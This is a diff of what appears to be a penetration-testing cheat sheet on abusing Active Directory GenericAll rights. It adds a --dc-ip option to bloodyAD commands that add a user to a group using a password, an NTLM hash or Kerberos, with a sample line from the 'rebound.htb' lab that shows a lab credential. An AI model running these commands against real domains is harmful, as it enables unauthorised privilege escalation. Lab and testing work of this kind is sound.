@@ -14,7 +14,7 @@ tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controlle
 
 ```console
 # Password
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console {class="sample-code"}
@@ -24,12 +24,12 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add gr
 
 ```console
 # NTLM
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console
 # Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console {class="sample-code"}
